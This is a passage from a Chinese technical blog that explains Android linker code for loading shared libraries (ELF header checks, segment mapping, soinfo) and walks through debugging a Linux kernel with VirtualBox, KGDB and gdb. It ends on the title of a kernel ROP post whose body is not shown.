<p><code>ReadElfHeader</code>使用<code>read</code>直接从so文件中将<code>elfheader</code>读取到<code>header_</code>中，<code>header_</code>为<code>ElfReader</code>的成员变量，类型为<code>Elf32_Ehdr</code>，通过<code>header_</code>可以方便的访问elf header中各个字段，elf header中包含有program header table、section header table等重要信息。<br>对elf header的验证包括:</p>
<ul>
<li>magic字节</li>
<li>32/64 bit与当前平台是否一致</li>
<li>大小端</li>
<li>类型：可执行文件、so…</li>
<li>版本：一般为 1，表示当前版本</li>
<li>平台：ARM、x86、amd64…</li>
</ul>
<p>有任何错误都会导致加载失败。</p>
<h4 id="Read-ProgramHeader"><a href="#Read-ProgramHeader" class="headerlink" title="Read ProgramHeader"></a>Read ProgramHeader</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ElfReader::ReadProgramHeader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">phdr_num_ = header_.e_phnum; <span class="comment">// program header数量</span></span><br><span class="line"><span class="comment">// mmap 要求页对齐</span></span><br><span class="line">ElfW(Addr) page_min = PAGE_START(header_.e_phoff);</span><br><span class="line">ElfW(Addr) page_max = PAGE_END(header_.e_phoff + (phdr_num_ * <span class="keyword">sizeof</span>(ElfW(Phdr))));</span><br><span class="line">ElfW(Addr) page_offset = PAGE_OFFSET(header_.e_phoff);</span><br><span class="line">phdr_size_ = page_max – page_min;</span><br><span class="line"><span class="comment">// 使用mmap将program header映射到内存</span></span><br><span class="line"><span class="keyword">void</span>* mmap_result = mmap(<span class="literal">NULL</span>, phdr_size_, PROT_READ, MAP_PRIVATE, fd_, page_min);</span><br><span class="line">phdr_mmap_ = mmap_result;</span><br><span class="line"><span class="comment">// ElfReader 的成员变量 phdr_table_ 指向program header table</span></span><br><span class="line">phdr_table_ = <span class="keyword">reinterpret_cast</span>&lt;ElfW(Phdr)*&gt;(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(mmap_result) + page_offset);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将program header在内存中单独映射一份，用于解析program header时临时使用，在so装载到内存后，便会释放这块内存，转而使用装载后的so中的program header。</p>
<h4 id="reserve-space-amp-计算load-size"><a href="#reserve-space-amp-计算load-size" class="headerlink" title="reserve space &amp; 计算load size"></a>reserve space &amp; 计算load size</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ElfReader::ReserveAddressSpace</span><span class="params">(<span class="keyword">const</span> Android_dlextinfo* extinfo)</span> </span>&#123;</span><br><span class="line">  ElfW(Addr) min_vaddr;</span><br><span class="line">  <span class="comment">// 计算加载so需要的空间大小</span></span><br><span class="line">  load_size_ = phdr_table_get_load_size(phdr_table_, phdr_num_, &amp;min_vaddr);</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// min_vaddr一般情况为零，如果不是则表明so指定了加载基址</span></span><br><span class="line">  <span class="keyword">uint8_t</span>* addr = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint8_t</span>*&gt;(min_vaddr);</span><br><span class="line">  <span class="keyword">void</span>* start;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">int</span> mmap_flags = MAP_PRIVATE | MAP_ANONYMOUS;</span><br><span class="line">  start = mmap(addr, load_size_, PROT_NONE, mmap_flags, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  ...</span><br><span class="line">  load_start_ = start;</span><br><span class="line">  load_bias_ = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint8_t</span>*&gt;(start) – addr;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先调用<code>phdr_table_get_load_size</code>函数获取so在内存中需要的空间load_size，然后使用mmap匿名映射，预留出相应的空间。<br>关于<code>loadbias</code>：so可以指定加载基址，但是so指定的加载基址可能不是页对齐的，这种情况会导致实际映射地址和指定的加载地址有一个偏差，这个偏差便是<code>load_bias_</code>，之后在针对虚拟地址进行计算时需要使用<code>load_bias_</code>修正。普通的so都不会指定加载基址，这时<code>min_vaddr = 0</code>，则<code>load_bias_ = load_start_</code>，即<code>load_bias_</code>等于加载基址，下文会将<code>load_bias_</code>直接称为基址。<br>下面深入<code>phdr_table_get_load_size</code>分析一下<code>load_size</code>的计算：使用成员变量<code>phdr_table</code>遍历所有的<code>program header</code>， 找到所有类型为<code>PT_LOAD</code>的segment的<code>p_vaddr</code>的最小值，<code>p_vaddr + p_memsz</code>的最大值，分别作为<code>min_vaddr</code>和<code>max_vaddr</code>，在将两个值分别对齐到页首和页尾，最终使用对齐后的 <code>max_vaddr – min_vaddr</code>得到<code>load_size</code>。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">phdr_table_get_load_size</span><span class="params">(<span class="keyword">const</span> ElfW(Phdr)* phdr_table, <span class="keyword">size_t</span> phdr_count,</span></span></span><br><span class="line"><span class="function"><span class="params">    ElfW(Addr)* out_min_vaddr,</span></span></span><br><span class="line"><span class="function"><span class="params">    ElfW(Addr)* out_max_vaddr)</span> </span>&#123;</span><br><span class="line">  ElfW(Addr) min_vaddr = UINTPTR_MAX;</span><br><span class="line">  ElfW(Addr) max_vaddr = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">bool</span> found_pt_load = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; phdr_count; ++i) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Phdr)</span>* phdr </span>= &amp;phdr_table[i];</span><br><span class="line">    <span class="keyword">if</span> (phdr-&gt;p_type != PT_LOAD) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    found_pt_load = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (phdr-&gt;p_vaddr &lt; min_vaddr) &#123;</span><br><span class="line">      min_vaddr = phdr-&gt;p_vaddr;         <span class="comment">// 记录最小的虚拟地址</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (phdr-&gt;p_vaddr + phdr-&gt;p_memsz &gt; max_vaddr) &#123;</span><br><span class="line">      max_vaddr = phdr-&gt;p_vaddr + phdr-&gt;p_memsz;  <span class="comment">// 记录最大的虚拟地址</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!found_pt_load) &#123;</span><br><span class="line">    min_vaddr = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  min_vaddr = PAGE_START(min_vaddr);      <span class="comment">// 页对齐</span></span><br><span class="line">  max_vaddr = PAGE_END(max_vaddr);        <span class="comment">// 页对齐</span></span><br><span class="line">  <span class="keyword">if</span> (out_min_vaddr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    *out_min_vaddr = min_vaddr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (out_max_vaddr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    *out_max_vaddr = max_vaddr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> max_vaddr – min_vaddr;         <span class="comment">// load_size = max_vaddr – min_vaddr</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Load-Segments"><a href="#Load-Segments" class="headerlink" title="Load Segments"></a>Load Segments</h4><p>遍历program header table，找到类型为<code>PT_LOAD</code>的segment：<br>计算segment在内存空间中的起始地址<code>segstart</code>和结束地址<code>seg_end</code>，<code>seg_start</code>等于虚拟偏移加上基址<code>load_bias</code>，同时由于<code>mmap</code>的要求，都要对齐到页边界得到<code>seg_page_start</code>和<code>seg_page_end</code>。<br>计算segment在文件中的页对齐后的起始地址<code>file_page_start</code>和长度<code>file_length</code>。<br>使用mmap将segment映射到内存，指定映射地址为<code>seg_page_start</code>，长度为<code>file_length</code>，文件偏移为 <code>file_page_start</code>。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ElfReader::LoadSegments</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; phdr_num_; ++i) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Phdr)</span>* phdr </span>= &amp;phdr_table_[i];</span><br><span class="line">    <span class="keyword">if</span> (phdr-&gt;p_type != PT_LOAD) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// segment在内存中的地址.</span></span><br><span class="line">    ElfW(Addr) seg_start = phdr-&gt;p_vaddr + load_bias_;</span><br><span class="line">    ElfW(Addr) seg_end   = seg_start + phdr-&gt;p_memsz;</span><br><span class="line">    ElfW(Addr) seg_page_start = PAGE_START(seg_start);</span><br><span class="line">    ElfW(Addr) seg_page_end   = PAGE_END(seg_end);</span><br><span class="line">    ElfW(Addr) seg_file_end   = seg_start + phdr-&gt;p_filesz;</span><br><span class="line">    <span class="comment">// 文件偏移</span></span><br><span class="line">    ElfW(Addr) file_start = phdr-&gt;p_offset;</span><br><span class="line">    ElfW(Addr) file_end   = file_start + phdr-&gt;p_filesz;</span><br><span class="line">    ElfW(Addr) file_page_start = PAGE_START(file_start);</span><br><span class="line">    ElfW(Addr) file_length = file_end – file_page_start;</span><br><span class="line">    <span class="keyword">if</span> (file_length != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// 将文件中的segment映射到内存</span></span><br><span class="line">      <span class="keyword">void</span>* seg_addr = mmap(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">void</span>*&gt;(seg_page_start),</span><br><span class="line">        file_length,</span><br><span class="line">        PFLAGS_TO_PROT(phdr-&gt;p_flags),</span><br><span class="line">        MAP_FIXED|MAP_PRIVATE,</span><br><span class="line">        fd_,</span><br><span class="line">        file_page_start);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果segment可写, 并且没有在页边界结束，那么就将segemnt end到页边界的内存清零。</span></span><br><span class="line">    <span class="keyword">if</span> ((phdr-&gt;p_flags &amp; PF_W) != <span class="number">0</span> &amp;&amp; PAGE_OFFSET(seg_file_end) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">memset</span>(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">void</span>*&gt;(seg_file_end), <span class="number">0</span>, PAGE_SIZE – PAGE_OFFSET(seg_file_end));</span><br><span class="line">    &#125;</span><br><span class="line">    seg_file_end = PAGE_END(seg_file_end);</span><br><span class="line">    <span class="comment">// 将(内存长度 – 文件长度)对应的内存进行匿名映射</span></span><br><span class="line">    <span class="keyword">if</span> (seg_page_end &gt; seg_file_end) &#123;</span><br><span class="line">      <span class="keyword">void</span>* zeromap = mmap(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">void</span>*&gt;(seg_file_end),</span><br><span class="line">        seg_page_end – seg_file_end,</span><br><span class="line">        PFLAGS_TO_PROT(phdr-&gt;p_flags),</span><br><span class="line">        MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,</span><br><span class="line">        <span class="number">-1</span>,</span><br><span class="line">        <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="分配-soinfo"><a href="#分配-soinfo" class="headerlink" title="分配 soinfo"></a>分配 soinfo</h3><p><code>load_library</code>在调用<code>load_segments</code>完成装载后，接着调用<code>soinfo_alloc</code>函数为目标so分配<code>soinfo</code>，<code>soinfo_alloc</code>函数实现如下：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> soinfo* <span class="title">soinfo_alloc</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* name, struct stat* file_stat)</span> </span>&#123;</span><br><span class="line">  soinfo* si = g_soinfo_allocator.alloc();  <span class="comment">//分配空间，可以简单理解为malloc</span></span><br><span class="line">  <span class="comment">// Initialize the new element.</span></span><br><span class="line">  <span class="built_in">memset</span>(si, <span class="number">0</span>, <span class="keyword">sizeof</span>(soinfo));</span><br><span class="line">  strlcpy(si-&gt;name, name, <span class="keyword">sizeof</span>(si-&gt;name));</span><br><span class="line">  si-&gt;flags = FLAG_NEW_SOINFO;</span><br><span class="line">  sonext-&gt;next = si;    <span class="comment">// 加入到存有所有soinfo的链表中</span></span><br><span class="line">  sonext = si;</span><br><span class="line">  <span class="keyword">return</span> si;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Linker为每个so维护了一个<code>soinfo</code>结构，调用<code>dlopen</code>时，返回的handler其实就是一个指向该so的<code>soinfo</code>指针。<code>soinfo</code>保存了so加载链接以及运行期间所需的各类信息，简单列举一下:<br>装载链接期间主要使用的成员:</p>
<ul>
<li>装载信息<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Phdr)</span>* phdr</span>;</span><br><span class="line"><span class="keyword">size_t</span> phnum;</span><br><span class="line">ElfW(Addr) base;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br></pre></td></tr></table></figure></li>
<li>符号信息<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* strtab;</span><br><span class="line">ElfW(Sym)* symtab;</span><br></pre></td></tr></table></figure></li>
<li>重定位信息<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Rel)* plt_rel;</span><br><span class="line"><span class="keyword">size_t</span> plt_rel_count;</span><br><span class="line">ElfW(Rel)* rel;</span><br><span class="line"><span class="keyword">size_t</span> rel_count;</span><br></pre></td></tr></table></figure></li>
<li>init函数和finit函数<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Linker_function_t* init_array;</span><br><span class="line"><span class="keyword">size_t</span> init_array_count;</span><br><span class="line">Linker_function_t* fini_array;</span><br><span class="line"><span class="keyword">size_t</span> fini_array_count;</span><br><span class="line">Linker_function_t init_func;</span><br><span class="line">Linker_function_t fini_func;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>运行期间主要使用的成员：</p>
<ul>
<li>导出符号查找（dlsym）<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* strtab;</span><br><span class="line">ElfW(Sym)* symtab;</span><br><span class="line"><span class="keyword">size_t</span> nbucket;</span><br><span class="line"><span class="keyword">size_t</span> nchain;</span><br><span class="line"><span class="keyword">unsigned</span>* bucket;</span><br><span class="line"><span class="keyword">unsigned</span>* chain;</span><br><span class="line">ElfW(Addr) load_bias;</span><br></pre></td></tr></table></figure></li>
<li>异常处理<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span>* ARM_exidx;</span><br><span class="line"><span class="keyword">size_t</span> ARM_exidx_count;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p><code>load_library</code>在为so分配<code>soinfo</code>后，会将装载结果更新到<code>soinfo</code>中，后面的链接过程就可以直接使用<code>soinfo</code>的相关字段去访问so中的信息。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">si-&gt;base = elf_reader.load_start();</span><br><span class="line">si-&gt;size = elf_reader.load_size();</span><br><span class="line">si-&gt;load_bias = elf_reader.load_bias();</span><br><span class="line">si-&gt;phnum = elf_reader.phdr_count();</span><br><span class="line">si-&gt;phdr = elf_reader.loaded_phdr();</span><br></pre></td></tr></table></figure>
<p><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://yaq.qq.com/blog/14">http://yaq.qq.com/blog/14</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/07/01/VirtualBox%E4%B8%8A%E8%B0%83%E8%AF%95Linux-Kernel/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/07/01/VirtualBox%E4%B8%8A%E8%B0%83%E8%AF%95Linux-Kernel/" class="post-title-link" itemprop="url">VirtualBox上调试Linux Kernel</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-07-01 20:44:32" itemprop="dateCreated datePublished" datetime="2017-07-01T20:44:32+08:00">2017-07-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>之前写过用VMware调试Linux Kernel，今天又尝试了一下VirtualBox+gdb的组合。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我的环境，主机：Ubuntu14.04<br>虚拟机：VirtualBox5.1<br>客户机：Ubuntu12.04.5 x64<br>1.首先在VirtualBox上安装客户机<br>编译安装<a target="_blank" rel="noopener" href="https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.13.tar.gz">linux-3.13内核</a>（一般是将源码放到/usr/src中）：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install libncurses5-dev</span><br><span class="line">$ make menuconfig</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install modules_install</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure>
<p>这里我把编译过的内核源码用tar压缩后，通过共享文件夹（需要安装增强工具）拷贝到主机上再解压，这样就可以进行源码级调试了。<br>2.安装后关闭客户机，启用串口：<br><img src="/images/kerneldebug/serialport.png"><br>3.启用客户机KGDB：<br>这里有两种方法，一是在内核启动项中添加参数：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kgdboc&#x3D;ttyS0,115200</span><br></pre></td></tr></table></figure>
<p>或者是在启动内核后执行：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># echo ttyS0,115200 &gt; &#x2F;sys&#x2F;module&#x2F;kgdboc&#x2F;parameters&#x2F;kgdboc</span><br></pre></td></tr></table></figure>
<blockquote>
<p>建议使用第一种，要不每次开机都得输入命令。修改方法是编辑/boot/grub/grub.cfg，在启动的内核项加上参数即可。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;boot&#x2F;grub&#x2F;grub.cfg</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">...</span><br><span class="line">set defualt&#x3D;&quot;2&quot; # 将启动项修改为刚刚编译安装的内核（从0开始，第2个menuentry）</span><br><span class="line">...</span><br><span class="line">submenu &quot;Previous Linux versions&quot; &#123;</span><br><span class="line">menuentry &#39;Ubuntu, with Linux 3.13.0&#39; --class ubuntu --class gnu-linux --class gnu --class os &#123;</span><br><span class="line">        recordfail</span><br><span class="line">        gfxmode $linux_gfx_mode</span><br><span class="line">        insmod gzio</span><br><span class="line">        insmod part_msdos</span><br><span class="line">        insmod ext2</span><br><span class="line">        set root&#x3D;&#39;(hd0,msdos1)&#39;</span><br><span class="line">        search --no-floppy --fs-uuid --set&#x3D;root 294b8f76-001b-4367-bead-3053c38b2578</span><br><span class="line">        linux   &#x2F;boot&#x2F;vmlinuz-3.13.0 root&#x3D;UUID&#x3D;294b8f76-001b-4367-bead-3053c38b2578 ro   quiet splash $vt_handoff kgdboc&#x3D;ttyS0,115200 # 添加内核启动参数</span><br><span class="line">        initrd  &#x2F;boot&#x2F;initrd.img-3.13.0</span><br><span class="line">&#125;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<p>3.客户机上执行：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># echo g &gt; &#x2F;proc&#x2F;sysrq-trigger</span><br></pre></td></tr></table></figure>
<p>4.主机连接到客户机：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ cd linux-3.13</span><br><span class="line">$ socat -d -d &#x2F;tmp&#x2F;serial pty &amp;</span><br><span class="line">[1] 7907</span><br><span class="line">2017&#x2F;07&#x2F;01 11:56:40 socat[7907] N opening connection to AF&#x3D;1 &quot;&#x2F;tmp&#x2F;serial&quot;                                              </span><br><span class="line">2017&#x2F;07&#x2F;01 11:56:40 socat[7907] N successfully connected from local address AF&#x3D;1 &quot;:\xAD\xEE\x7E&quot;</span><br><span class="line">2017&#x2F;07&#x2F;01 11:56:40 socat[7907] N successfully connected via &lt;anon&gt;</span><br><span class="line">2017&#x2F;07&#x2F;01 11:56:40 socat[7907] N PTY is &#x2F;dev&#x2F;pts&#x2F;4</span><br><span class="line">2017&#x2F;07&#x2F;01 11:56:40 socat[7907] N starting data transfer loop with FDs [3,3] and [4,4]</span><br><span class="line">$ gdb vmlinux</span><br><span class="line">(gdb) target remote &#x2F;dev&#x2F;pts&#x2F;4</span><br><span class="line">Remote debugging using &#x2F;dev&#x2F;pts&#x2F;4</span><br><span class="line">kgdb_breakpoint () at kernel&#x2F;debug&#x2F;debug_core.c:1042</span><br><span class="line">1042        wmb(); &#x2F;* Sync point after breakpoint *&#x2F;</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
<p>gdb中c继续执行内核，客户机上<code># echo g &gt; /proc/sysrq-trigger</code>暂停执行。接下来就可以随意调试了！<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://spekii.blogspot.com/2014/09/debug-running-kernel-module-with-gdb_16.html">Debug a running kernel module with GDB and VirtualBox</a><br><a target="_blank" rel="noopener" href="https://github.com/AltraMayor/XIA-for-Linux/wiki/Debugging-the-Linux-kernel">Debugging the Linux kernel</a><br><a target="_blank" rel="noopener" href="https://fotisl.com/blog/2009/09/debugging-the-linux-kernel-using-kgdb-and-virtualbox/">Debugging the linux kernel using kgdb and VirtualBox</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/06/28/Linux-x64%E5%86%85%E6%A0%B8ROP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/06/28/Linux-x64%E5%86%85%E6%A0%B8ROP/" class="post-title-link" itemprop="url">Linux x64内核ROP</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

